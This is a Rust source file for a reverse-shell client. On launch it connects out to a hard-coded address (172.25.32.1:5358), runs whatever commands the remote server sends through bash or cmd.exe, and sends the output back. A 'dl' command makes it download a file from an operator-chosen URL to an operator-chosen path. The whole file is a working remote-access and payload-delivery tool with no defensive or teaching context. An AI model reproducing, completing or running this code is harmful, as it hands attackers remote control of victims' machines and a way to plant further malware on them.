use std::net::{Ipv4Addr,SocketAddrV4,TcpListener,TcpStream,Shutdown};
use std::process::{Command,exit};
use std::io::{self, Write, BufReader, BufRead};
use std::process::Output;

fn executecmd(cmd:&str) -> String{
    let client_os: (&str, String);
    client_os = if cfg!(target_os = "windows") {
        ("cmd.exe", "/c ".to_owned())
    } else {
        ("/bin/bash", "-c ".to_owned())
    };
    let (base, temp) = client_os;
    let fullcmd =  temp + cmd;
    let cmds: Vec<&str> = fullcmd.split(" ").collect();
    let extra_args: bool = if cmds.len() > 1 {
        true
    } else {
        false
    };

    let change_dir: bool = if extra_args {
        cmds[1] == "cd"
    } else {
        false
    };

    let mut stdout = String::new();
    let mut stderr = String::new();
    if change_dir {
        let dir = cmds[2].to_string();
        if std::env::set_current_dir(dir.trim()).is_ok() {
            let success = "New directory:";
            stdout = [success, &dir].join(" ");
            
        } else {
            stderr = "Could not change directory".to_owned();
        }
    } else {
        let res: Output = Command::new(base).args(&cmds).output().unwrap();
        stdout = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
        stderr = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
    }
    if stdout.len()>0{
        return stdout;
    }
    else{
        return stderr;
    }
}

use std::cmp::min;
use std::fs::{File, OpenOptions};
use std::io::{Seek};
use reqwest::Client;
use indicatif::{ProgressBar, ProgressStyle};
use futures_util::StreamExt;

pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(), String> {
    let res = client
        .get(url)
        .send()
        .await
        .or(Err(format!("Failed to GET from '{}'", &url)))?;
    let total_size = res
        .content_length()
        .ok_or(format!("Failed to get content length from '{}'", &url))?;

    let pb = ProgressBar::new(total_size);
    pb.set_style(ProgressStyle::default_bar()
        .template("{msg}\n{spinner:.green} [{elapsed_precise}] [{wide_bar:.white/blue}] {bytes}/{total_bytes} ({bytes_per_sec}, {eta})")
        .progress_chars("█  "));
    pb.set_message(&format!("Downloading {}", url));

    let mut file;
    let mut downloaded: u64 = 0;
    let mut stream = res.bytes_stream();
    
    println!("Seeking in file.");
    if std::path::Path::new(path).exists() {
        println!("File exists. Resuming.");
        file = std::fs::OpenOptions::new()
            .read(true)
            .append(true)
            .open(path)
            .unwrap();

        let file_size = std::fs::metadata(path).unwrap().len();
        file.seek(std::io::SeekFrom::Start(file_size)).unwrap();
        downloaded = file_size;

    } else {
        println!("Fresh file..");
        file = File::create(path).or(Err(format!("Failed to create file '{}'", path)))?;
    }

    println!("Commencing transfer");
    while let Some(item) = stream.next().await {
        let chunk = item.or(Err(format!("Error while downloading file")))?;
        file.write(&chunk)
            .or(Err(format!("Error while writing to file")))?;
        let new = min(downloaded + (chunk.len() as u64), total_size);
        downloaded = new;
        pb.set_position(new);
    }
    pb.finish_with_message(&format!("Downloaded {} to {}", url, path));
    return Ok(());
}

pub async fn do_dl(url: &str, filenm: &str){
    
    download_file(&Client::new(), &url, &filenm).await.unwrap();
    println!("async fcn ran");
}

#[tokio::main]
async fn main() {

    let mut client =TcpStream::connect("172.25.32.1:5358").unwrap();
    println!("Connected to: {}", client.peer_addr().unwrap());

    loop{
        let mut buffer:Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);
        reader.read_until(b'\0', &mut buffer);
        println!("reciever from server: {}", String::from_utf8_lossy(&buffer).trim());
        let text : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
        //assert_eq!("dl", &text, "we are testing if dl with {} and {}", "dl", &text);
        if buffer.len()==0 ||
        &text=="quit"{
            println!("break");
            break;
        }

        if &text=="dl"{
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            println!("reciever from server in dl 1: {}", String::from_utf8_lossy(&buffer).trim());
            let urltext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            println!("ooutput dl url capture check: {}", urltext);
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            println!("reciever from server in dl mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
            let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            //println!("ooutput dl fn capture check: {}", fntext);
            println!("downloading files...");
            download_file(&Client::new(), &urltext, &fntext).await.unwrap();
            println!("Files downloaded...");
        }
        let mut output =executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
        output.push('\0');
        client.write(&mut output.as_bytes());
    }
    client.shutdown(Shutdown::Both);

}
